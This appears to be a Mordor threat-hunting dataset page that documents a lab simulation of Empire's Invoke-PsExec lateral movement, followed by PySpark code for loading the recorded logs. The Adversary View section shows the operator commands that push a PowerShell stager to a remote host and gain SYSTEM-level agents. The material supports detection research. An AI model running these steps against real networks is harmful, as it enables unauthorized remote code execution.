# Empire Invoke PsExec

## Metadata


|                   |    |
|:------------------|:---|
| id                | SD-190518210652 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 19/05/18 |
| platform          | Windows |
| Mordor Environment| shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_movement/Invoke-PsExec.ps1 |
| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/execution/empire_invoke_psexec.tar.gz |

## Dataset Description
This dataset represents adversaries executing malicious code remotely psexec style

## Adversary View
```
(Empire: V6W3TH8Y) > usemodule lateral_movement/invoke_psexec
(Empire: powershell/lateral_movement/invoke_psexec) > 
(Empire: powershell/lateral_movement/invoke_psexec) > info

              Name: Invoke-PsExec
            Module: powershell/lateral_movement/invoke_psexec
        NeedsAdmin: False
        OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: True
  OutputExtension: None

Authors:
  @harmj0y

Description:
  Executes a stager on remote hosts using PsExec type
  functionality.

Comments:
  https://github.com/rapid7/metasploit-
  framework/blob/master/tools/psexec.rb

Options:

  Name         Required    Value                     Description
  ----         --------    -------                   -----------
  Listener     False                                 Listener to use.                        
  ProxyCreds   False       default                   Proxy credentials                       
                                                    ([domain\]username:password) to use for 
                                                    request (default, none, or other).      
  ComputerName True                                  Host[s] to execute the stager on, comma 
                                                    separated.                              
  ServiceName  True        Updater                   The name of the service to create.      
  Command      False                                 Custom command to execute on remote     
                                                    hosts.                                  
  Proxy        False       default                   Proxy to use for request (default, none,
                                                    or other).                              
  UserAgent    False       default                   User-agent string to use for the staging
                                                    request (default, none, or other).      
  Agent        True        V6W3TH8Y                  Agent to run module on.                 
  ResultFile   False                                 Name of the file to write the results to
                                                    on agent machine.                       

(Empire: powershell/lateral_movement/invoke_psexec) > set Listener https
(Empire: powershell/lateral_movement/invoke_psexec) > set ComputerName IT001.shire.com
(Empire: powershell/lateral_movement/invoke_psexec) > execute
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked V6W3TH8Y to run TASK_CMD_JOB
[*] Agent V6W3TH8Y tasked with task ID 2
[*] Tasked agent V6W3TH8Y to run module powershell/lateral_movement/invoke_psexec
(Empire: powershell/lateral_movement/invoke_psexec) > Job started: 9GY4PC
[*] Sending POWERSHELL stager (stage 1) to 10.0.10.103
[*] New agent EXBNZYTS checked in
[+] Initial agent EXBNZYTS from 10.0.10.103 now active (Slack)
[*] Sending agent (stage 2) to EXBNZYTS at 10.0.10.103

(Empire: powershell/lateral_movement/invoke_psexec) > 
(Empire: powershell/lateral_movement/invoke_psexec) > agents

[*] Active agents:

Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
H3DKB8SA ps 172.18.39.106   HR001             SHIRE\nmartha           powershell         5172   5/0.0    2019-05-18 21:07:43  https           
TKV35P8X ps 172.18.39.106   HR001             *SHIRE\nmartha          powershell         5452   5/0.0    2019-05-18 21:07:42  https           
EMDBFPSY ps 172.18.39.106   HR001             SHIRE\nmartha           notepad            7924   5/0.0    2019-05-18 21:07:44  https           

V6W3TH8Y ps 172.18.39.106   HR001             SHIRE\pgustavo          powershell         5204   5/0.0    2019-05-18 21:07:42  https           
XSZ91N7T ps 172.18.39.105   IT001             *SHIRE\SYSTEM           powershell         4172   5/0.0    2019-05-18 21:07:43  https           
EXBNZYTS ps 172.18.39.105   IT001             *SHIRE\SYSTEM           powershell         6728   5/0.0    2019-05-18 21:07:42  https           


(Empire: agents) >  
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/execution/empire_invoke_psexec.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT channel, COUNT(1)
FROM mordorTable
GROUP BY channel
    '''
)
df.show(10,False)
        